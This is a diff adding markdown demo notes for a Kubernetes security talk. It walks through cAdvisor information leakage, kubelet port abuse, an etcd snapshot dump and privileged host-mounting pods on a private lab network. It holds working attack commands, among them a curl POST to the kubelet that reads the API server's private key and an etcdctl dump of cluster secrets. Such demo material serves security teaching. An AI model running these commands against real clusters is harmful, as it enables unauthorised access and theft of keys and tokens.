@@ -1,0 +1,67 @@
+# Demo Notes
+
+## Kubernetes Demo
+
+kubectl create -f example.yaml
+
+This should spin up the guestbook example using the repo. on 192.168.200.50 (don't forget to start this VM)
+
+then kubectl get svc to get a note of the port to check for the service.
+
+then http://knode1:<port>
+
+to demonstrate the service running
+
+
+## cAdvisor Information Leakage
+
+The cAdvisor port is exposed by default in many k8s installations at 4194/TCP.  So in a browser assuming that we have access to the cluster over a network we can simply browse to the port to look around
+
+http://192.168.200.10:4194 
+
+and it'll show us information relating to the cluster.  Whilst none of it is an immediate slam dunk compromise, it does provide quite a bit of interesting info. that could be useful.
+
+##  Attacking the Kubelet
+
+There are two ports which are commonly listening relating to the kubelet. 
+
+10250/TCP - Read/Write access
+10255/TCP - Read only access.
+
+attacking the readonly port we can get more info. disclosure
+
+/pods
+/metrics
+/stats/summary
+/spec/
+
+so http://knode1:10255/pods can provide us some interesting information. including things like the fact that privileged containers are permitted and the insecure port is available!.
+
+Attacking the main kubelet port we can do a lot more, if it's exposed.
+
+https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadm1/kube-apiserver/
+
+curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadm1/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/apiserver.key"
+
+# Using Service Tokens
+
+kubectl create -f badcontainer.yml
+
+No config needed, it just knows where to go.
+
+## Attacking etcd
+
+export ETCDCTL_API=3
+etcdctl --endpoints=http://192.168.200.10:2379 snapshot save test2.db
+
+This dumps the etcd database into a file.  It's not pure text however things like service account tokens are stored in there, so it should be relatively easy to extract that information from the system.
+
+## Abusing user rights
+
+Unless items like podsecuritypolicy have been deployed to the cluster it's possible to run prvileged containers and also to mount in volumes from the host.
+ 
+kubectl create -f privpod.yml
+
+cd /node
+
+whoami
